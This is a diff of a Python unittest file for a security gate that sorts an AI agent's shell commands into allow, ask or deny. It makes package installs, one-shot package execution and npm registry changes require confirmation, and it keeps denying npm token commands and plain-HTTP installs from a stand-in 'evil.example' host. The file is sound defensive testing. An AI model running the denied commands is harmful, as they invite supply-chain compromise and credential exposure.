@@ -320,12 +320,73 @@ class SecurityGateTests(unittest.TestCase):
         self.assert_deny("npm ci --registry=http://insecure.org/", "T5_SUPPLY_CHAIN")
         self.assert_deny("npm install git+http://evil.example/pkg.git", "T5_SUPPLY_CHAIN")
 
-    def test_t5_allowed_standard_package_installs(self):
-        self.assert_allow("pip install pytest requests")
-        self.assert_allow("uv pip install -r requirements.txt")
-        self.assert_allow("npm install lodash")
-        self.assert_allow("pnpm add express")
-        self.assert_allow("npm ci")
+    def test_t5_package_installs_always_ask(self):
+        # TK-51 (user policy 2026-09-05, variant b): every agent-driven
+        # package installation asks — bare installs, short verbs, ci/update/
+        # upgrade, HTTPS tarballs and git URLs included (HTTP endpoints keep
+        # denying via the branches above).
+        for cmd in (
+            "npm install",
+            "npm i lodash",
+            "npm ci",
+            "npm install lodash",
+            "pnpm add express",
+            "pnpm i",
+            "yarn",
+            "yarn add x",
+            "yarn install",
+            "bun install",
+            "bun add x",
+            "npm update",
+            "npm upgrade",
+            "npm install https://example.com/x.tgz",
+            "npm install git+https://example.com/pkg.git",
+        ):
+            self.assert_ask(cmd, "T5_SUPPLY_CHAIN")
+
+    def test_t5_installer_one_shot_execution_asks(self):
+        # TK-51: one-shot fetch-and-run package execution (npx class).
+        self.assert_ask("npm exec -y pkg", "T5_SUPPLY_CHAIN")
+        self.assert_ask("npm exec --yes pkg", "T5_SUPPLY_CHAIN")
+        self.assert_ask("npm init vite", "T5_SUPPLY_CHAIN")
+        self.assert_ask("npm create vite", "T5_SUPPLY_CHAIN")
+        self.assert_ask("yarn create next-app", "T5_SUPPLY_CHAIN")
+        self.assert_ask("pnpm create svelte", "T5_SUPPLY_CHAIN")
+        # bunx / bun x ALWAYS ask: bun has no interactive install prompt,
+        # so the bare-npx allow rationale is inapplicable (N-F7e).
+        self.assert_ask("bunx cowsay", "T5_SUPPLY_CHAIN")
+        self.assert_ask("bun x cowsay", "T5_SUPPLY_CHAIN")
+        self.assert_ask("deno install npm:chalk", "T5_SUPPLY_CHAIN")
+        self.assert_ask("deno add chalk", "T5_SUPPLY_CHAIN")
+        self.assert_ask("deno run npm:cowsay", "T5_SUPPLY_CHAIN")
+
+    def test_t5_python_stack_installs_ask(self):
+        # R2 2026-09-05: roll-back of the v2.3.0 mutator allow-list —
+        # pip/uv installs ask; `uv run` keeps its run semantics (allow).
+        for cmd in (
+            "pip install requests",
+            "pip3 install x",
+            "python3 -m pip install x",
+            "uv pip install x",
+            "uv add requests",
+            "uv sync",
+            "uv tool install ruff",
+        ):
+            self.assert_ask(cmd, "T5_SUPPLY_CHAIN")
+
+    def test_t5_mobile_and_data_dep_fetches_ask(self):
+        self.assert_ask("flutter pub get", "T5_SUPPLY_CHAIN")
+        self.assert_ask("dart pub get", "T5_SUPPLY_CHAIN")
+        self.assert_ask("flutter pub add http", "T5_SUPPLY_CHAIN")
+        self.assert_ask("dart pub add http", "T5_SUPPLY_CHAIN")
+        self.assert_ask("pod install", "T5_SUPPLY_CHAIN")
+        # dbt head ships with E5 (TK-43); the matrix row is live from TK-51.
+        self.assert_ask("dbt deps", "T5_SUPPLY_CHAIN")
+
+    def test_t5_install_dry_run_allowed(self):
+        # --dry-run executes no lifecycle scripts -> allow (TK-51 decision).
+        self.assert_allow("npm install --dry-run")
+        self.assert_allow("pnpm add --dry-run x")
 
     def test_t5_npx_dlx_auto_install_asks(self):
         # TK-48: auto-confirmed one-shot package execution -> ask
@@ -342,8 +403,21 @@ class SecurityGateTests(unittest.TestCase):
         # docstring). These stay on the allow path.
         self.assert_allow("npx cowsay")
         self.assert_allow("npx create-expo-app myapp")
-        self.assert_allow("pnpm add cowsay")
-        self.assert_allow("yarn add cowsay")
+        self.assert_allow("npm exec cowsay")
+
+    def test_t5_actx_prefixed_install_asks(self):
+        # actx-prefix is unwrapped before the checks (TK-39 unwrap parity).
+        self.assert_ask("actx run npm install x", "T5_SUPPLY_CHAIN")
+        self.assert_ask("actx --raw run pip install requests", "T5_SUPPLY_CHAIN")
+
+    def test_t5_allowed_readonly_package_managers(self):
+        self.assert_allow("npm list")
+        self.assert_allow("pip list")
+        self.assert_allow("uv run pytest")
+        self.assert_allow("deno run main.ts")
+        self.assert_allow("flutter analyze")
+        self.assert_allow("yarn --version")
+        self.assert_allow("bunx --version")
 
     # ------------------------------------------------------------------
     # T6: High-Risk Git Mutations (Ask Confirmation)
@@ -407,6 +481,9 @@ class SecurityGateTests(unittest.TestCase):
         self.assert_ask("cargo install --force ripgrep", "T6_HIGH_RISK_CARGO")
         self.assert_ask("cargo install -f ripgrep", "T6_HIGH_RISK_CARGO")
         self.assert_ask("cargo install --force=true ripgrep", "T6_HIGH_RISK_CARGO")
+        # TK-51: ANY cargo install asks (not just --force), cargo add too.
+        self.assert_ask("cargo install ripgrep", "T6_HIGH_RISK_CARGO")
+        self.assert_ask("cargo add serde", "T6_HIGH_RISK_CARGO")
 
     def test_t6_allowed_standard_cargo(self):
         self.assert_allow("cargo check")
@@ -417,7 +494,26 @@ class SecurityGateTests(unittest.TestCase):
         self.assert_allow("cargo fmt --check")
         self.assert_allow("cargo tree")
         self.assert_allow("cargo metadata --no-deps")
-        self.assert_allow("cargo install ripgrep")
+
+    def test_t6_npm_registry_operations_ask(self):
+        # TK-51: registry mutations follow the _check_high_risk_cargo
+        # precedent (publish / owner / access / org / team -> ask).
+        self.assert_ask("npm publish", "T6_HIGH_RISK_NPM")
+        self.assert_ask("npm owner add x", "T6_HIGH_RISK_NPM")
+        self.assert_ask("npm access grant user read pkg", "T6_HIGH_RISK_NPM")
+        self.assert_ask("npm org create myorg", "T6_HIGH_RISK_NPM")
+        self.assert_ask("npm team create myorg dev", "T6_HIGH_RISK_NPM")
+
+    def test_t6_npm_registry_dry_run_and_readonly_allowed(self):
+        self.assert_allow("npm publish --dry-run")
+        self.assert_allow("npm run build")
+        self.assert_allow("npm test")
+
+    def test_t6_npm_token_denied(self):
+        # Existing rule, explicit test (TK-51 DoD): npm token operations are
+        # denied by the T1 credential gate.
+        self.assert_deny("npm token create", "T1_CREDENTIAL_ACCESS")
+        self.assert_deny("npm token list", "T1_CREDENTIAL_ACCESS")
 
     # ------------------------------------------------------------------
     # T6: High-Risk Cloud/Infra CLI Mutations (Ask Confirmation) — TK-37
